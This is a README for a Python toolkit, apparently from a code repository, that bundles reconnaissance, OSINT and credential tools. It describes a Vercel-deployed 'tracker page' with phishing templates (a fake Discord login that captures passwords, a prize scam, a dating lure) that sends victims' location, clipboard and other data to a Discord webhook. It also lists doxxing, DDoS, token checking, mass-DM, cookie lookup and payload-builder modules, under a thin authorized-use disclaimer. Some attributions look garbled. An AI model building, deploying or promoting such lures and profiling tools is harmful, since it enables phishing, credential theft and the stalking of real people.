# Python Multi-Utility Toolkit

A comprehensive, multi-purpose system administration and information gathering toolkit built with Python. Designed for authorized professionals, researchers, and educators conducting legitimate system assessments and testing.

This toolkit integrates, orchestrates, and wraps numerous open-source utilities into a unified terminal interface, providing streamlined access to reconnaissance, auditing, credential testing, network profiling, and information gathering tools.

---

## Attributions & Third-Party Dependencies

This project integrates and references the following open-source repositories and tools:

### Go & Python Tools (External)
| Tool | Repository | Description |
|------|-----------|-------------|
| Sherlock | github.com/sherlock-project/sherlock | Username lookup across platforms |
| PhoneInfoga | github.com/smalleye105/phoneinfoga | Telecom & phone information lookup |
| Holehe | github.com/cynobit/robina | Email platform auditor |
| Socialscan | github.com/ioanc1212l/socialscan | Identity & account checking |
| Hashcat | github.com/hashcat/hashcat | Password auditing |
| Impacket | github.com/SecureAuthCorp/impacket | Network protocol tools |
| Nmap | github.com/nmap/nmap | Port & service discovery scanner |
| Metasploit | github.com/rapid7/metasploit-omnibus | Testing framework |

### Proxy List Repositories (External)
| Repository | Description |
|-----------|-------------|
| github.com/Syscallh00k/proxy-list | Proxy lists |
| github.com/TheSpeedX/SOCKS-List | Proxy list collections |
| github.com/SoliSpirit/proxy-list | Proxy lists |
| github.com/hproxy-com/free-proxy-list | HTTP/HTTPS/SOCKS proxy lists |
| github.com/clarketm/proxy-list | Curated proxy list reference |

### Python Packages (External)
| Package | Purpose |
|---------|---------|
| requests | HTTP client for API interactions |
| colorama | Terminal color output |
| rich | Rich terminal rendering (tables, panels, text) |
| dnspython | DNS resolution & record queries |
| python-whois | Domain registration lookup |
| pywin32 | Windows system integration (Windows only) |
| psutil | System resource monitoring |

### External API Services
| Service | Endpoint | Purpose |
|---------|----------|---------|
| ip-api.com | ip-api.com | IP geolocation & status detection |
| crt.sh | crt.sh | Certificate Transparency log search |
| RDAP | rdap.org | Domain registration & IP ownership data |
| Cloudflare DoH | cloudflare-dns.com | DNS-over-HTTPS resolution |
| XposedOrNot | xposedornot.com | Email breach data |
| Pwned Passwords | pwnedpasswords.com | Password check API |
| Tor Project | torproject.org | Tor exit node validation |
| DuckDuckGo | duckduckgo.com | Search integration |
| Tineye | tineye.com | Reverse image search |
| MacVendors | macvendors.com | MAC address vendor lookup |

### JavaScript Dependencies (Vercel Tracker)
| Library | Source | Purpose |
|---------|--------|---------|
| Native Fetch API | Built-in | HTTP requests from serverless functions |
| Node.js fs/path/dns | Node.js stdlib | File I/O, path resolution, DNS lookups |

All third-party tools, libraries, and data sources are used strictly per their respective licenses. See individual repositories for license details.

---

## Requirements

- **Python 3.8+**
- **Windows** recommended for full feature support
- Python packages listed in `setup/requirements.txt`
- **Node.js** (required for Vercel tracker deployment)
- **Vercel CLI** (`npm i -g vercel`) — required for cloud deployment option
- **Go** (optional, for Sherlock and PhoneInfoga integration)
- **Chocolatey** (optional, for automated tool installation on Windows)

### External Tools Integration

The toolkit can integrate with the following external tools if installed:

- **Nmap** — Install via `choco install nmap` or [nmap.org](https://nmap.org/)
- **Hashcat** — Install via `choco install hashcat`
- **Metasploit** — Install via `choco install metasploit`
- **Impacket** — Install via `pip install impacket`
- **Sherlock** — Install via `pipx install sherlock-project`
- **PhoneInfoga** — Install via official package or source
- **Holehe** — Install via `pip install holehe`
- **Socialscan** — Install via `pip install socialscan`

---

## Setup

### Quick Setup

```bash
# 1. Clone the repository
git clone https://github.com/kayden765/python-toolkit.git
cd python-toolkit

# 2. Install Python dependencies
pip install -r setup/requirements.txt

# 3. Launch the toolkit
python mainframe.py
```

### Windows Setup (Recommended)

Run `setup\setup.bat` as **Administrator** to auto-install all Python dependencies and external tools:

```bash
setup\setup.bat
```

This automated setup will:
- Install all Python dependencies from `setup/requirements.txt`
- Install **Impacket** and download `psexec.py` / `wmiexec.py` to `core/impacket_scripts/`
- Install **Chocolatey** package manager if not present
- Install **Hashcat**, **Metasploit**, **Nmap** via Chocolatey
- Check for **Node.js** and **Vercel CLI**
- Check for **Go**

After setup completes, restart your terminal and run `python mainframe.py`.

---

## Usage

- Use number keys to navigate menu options
- Press **ESC** to return to the previous menu
- Type `help` for a list of commands
- Type `tools` for a list of tool categories
- Type `credits` to see attributions
- Type `exit` to quit

---

## Feature Modules

### Directory 01 — Network & Recon
| Module | Description |
|--------|-------------|
| ICMP Latency Monitor | High-speed ping latency monitoring |
| Reverse DNS Resolver | Hostname resolution from IP addresses |
| Port Scanner | Multi-threaded TCP port discovery |
| Subnet Sweeper | ICMP-based network range enumeration |
| Banner Grabber | Service version detection |
| Subdomain Discovery | Passive subdomain enumeration |
| RDAP Mapper | Domain registration & IP ownership mapping |
| HTTP Header Auditor | Security header analysis |
| DNS-over-HTTPS Resolver | Encrypted DNS resolution |
| IP Geolocation | Location & ISP lookup |

### Directory 02 — OSINT & Profiling
| Module | Description |
|--------|-------------|
| Sherlock | Username lookup across platforms |
| PhoneInfoga | Telecom & phone lookup |
| Holehe | Email platform auditor |
| Socialscan | Identity & account checking |
| Data Breach Explorer | Email exposure lookup |
| Tor Validator | Tor exit node verification |
| IDN Analyzer | Internationalized domain phishing check |
| Name Database | Name search utilities |
| Reverse Image Search | Google/Tineye/Bing image lookup |
| WHOIS Lookup | Domain registration information |
| Email Validator | Email & MX record validation |

### Directory 03 — Local Audits & Utilities
| Module | Description |
|--------|-------------|
| Packet Monitor | Live network traffic monitoring |
| Key Leak Scanner | Secret/private key detection in files |
| Hash Generator | Cryptographic hash matrix generation |
| System Profiler | Local machine information collection |
| Base64 Matrix | Base64 encode/decode utilities |
| Python Obfuscator | Code obfuscation for research |
| Deobfuscator | Python code deobfuscation |

### Directory 04 — Advanced Audits
| Module | Description |
|--------|-------------|
| File Integrity Monitor | File change detection |
| SSL/TLS Auditor | Certificate analysis |
| Connection Profiler | Network connection inspection |
| Password Entropy Analyzer | Password strength validation |
| ARP Table Profiler | Local network device discovery |
| CIDR Calculator | Subnet calculation & range planning |
| UPnP Discovery | SSDP device enumeration |
| Hosts Auditor | DNS hosts file analysis |
| MAC Vendor Lookup | Hardware manufacturer identification |

### Directory 05 — System Tools Integration
| Module | Description |
|--------|-------------|
| Hashcat Auditor | Password compliance auditing |
| Tracker Page | Local or Vercel-hosted tracking page |
| Credential Tester | Brute-force testing framework (authorized use only) |
| Metasploit Console | Msfconsole launcher |
| Generator Module | Output creation |
| Imperson Suite | Administrative utility wrappers |
| Log Diagnostic | Real-time event analysis |
| Nmap Scanner | Advanced port & service profiling |

### Directory 06 — Discord Integration
| Module | Description |
|--------|-------------|
| Token Checker | Token information & validation |
| Webhook Manager | Webhook testing & deletion |
| Nitro Tool | Code generator & validator (testing) |
| Server Info | Guild metadata inspection |
| Server Cloner | Template-based server creation |
| Mass DM | Bulk message dispatch (rate-limited) |

### Directory 07 — Information Tools
| Module | Description |
|--------|-------------|
| Info Maker | Information organization & report generation |
| UK Address Lookup | Postcode area search & geographic information |
| UK Name Search | Person/director search |

### Directory 08 — Build Module
| Module | Description |
|--------|-------------|
| Builder Module | Configurable generation with system info collection |

### Directory 09 — Roblox Tools
| Module | Description |
|--------|-------------|
| Cookie Lookup | Account information |
| User ID Lookup | Account ID information |
| Username Lookup | Profile data retrieval |
| Group Info | Group metadata inspection |
| Game Info | Game metadata retrieval |

---

## Tracker Page — Vercel Deployment

The Tracker Page can be deployed to Vercel for a public URL that works across all platforms. The deployed page supports customizable templates and can collect GPS coordinates (with browser permission), clipboard contents (with permission), reverse DNS, port scan data, and more, all sent to a Discord webhook.

### Template Types
| Type | Description |
|------|-------------|
| Discord Login | Advanced Discord-style login page with email/password capture |
| Error Page | Fake system error page |
| Prize Scam | Gift card promotion page |
| E-Girl Finder | Dating site landing page with gallery and CTA button |
| Custom HTML | User-provided HTML content |
| Plain Image | Standard tracking pixel |

### Prerequisites
- Node.js installed (https://nodejs.org/)
- Vercel CLI installed: `npm install -g vercel`
- A Vercel account (free tier is sufficient)
- A Discord webhook URL for log delivery

### Deployment Steps

1. **Navigate to the Vercel project folder:**
```bash
cd core/vercel-tracker
```

2. **Deploy to Vercel:**
   ```bash
   vercel --prod
   ```
   Follow the prompts. The Vercel CLI outputs a public URL.

3. **Configure Webhooks:**
   The serverless function reads webhook URLs from environment variables.

4. **Configure Templates & Logging Options:**
   A `lure-config.json` file controls the page content.

5. **Verify deployment:**
   Open the deployed URL in a browser.

### Endpoints
| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Serves the tracking page |
| `/api/image` | GET | Returns tracking pixel |
| `/api/logs` | GET | Returns all captured logs as JSON |
| `/api/track-extra` | POST | Receives additional data from browser |

---

## Directory Structure

```
python-toolkit/
├── mainframe.py              # Main entry point & terminal interface
├── core/
│   ├── dir_banners.py       # Menu directory definitions
│   ├── dox_tools/           # Information gathering & report generation
│   ├── security_tools/      # Credential testing framework
│   ├── ddos_simulation/     # Network simulation utilities
│   ├── tracker_page/        # Local tracker server
│   ├── impacket_scripts/    # Impant utility wrappers
│   ├── roblox_tools/        # Roblox API integration
│   ├── payload_tools/       # Build framework
│   ├── ui/                  # Terminal UI components
│   ├── etc/                 # Shared utilities & settings
│   └── vercel-tracker/      # Vercel serverless deployment
│       ├── api/
│       │   └── track.js     # Main serverless function
│       ├── vercel.json      # Vercel configuration
│       ├── package.json     # Node.js manifest
│       ├── .env             # Local environment (not deployed)
│       ├── webhook-config.json  # Webhook URL config
│       └── lure-config.json  # Template & logging options
├── setup/
│   ├── requirements.txt     # Python dependencies
│   ├── README.md            # Setup documentation
│   └── setup.bat            # Automated Windows installer
├── tools/
│       ├── deployer.py          # Deployment framework
│   └── testers/
│       └── tester.py        # Brute-force testing tool
├── config.json             # Runtime configuration
└── AGENTS.md               # Development guidelines
```

---

## Configuration

Runtime configuration is stored in `config.json`. Key settings include:

- `public_host` — Public-facing IP address
- `public_port` — Communication port
- `listen_port` — Local listener port

---

## Disclaimer

**This toolkit is for authorized system testing, research, and educational purposes only.**

- Only use on systems you own or have explicit written permission to test
- This activity is restricted in most jurisdictions
- The authors are not responsible for misuse or damage caused by this tool
- Users assume all liability for their own actions
- This tool integrates third-party open-source utilities — each retains its own license
- Respect all applicable laws and regulations in your jurisdiction

---

## Support

If you find this project useful, consider supporting development:

### Bitcoin
```
bc1quaqzqt8g6xv7r854wqm5wsn4z3mwu9arnece6q
```

---

## Star Tracker

[![Stargazers](https://starchart.cc/kayden765/python-testing-toolkit.svg)](https://starchart.cc/kayden765/python-testing-toolkit)

## Tutorial

Setup and usage tutorials for every utility and module:
https://www.youtube.com/@kydn-iu5kd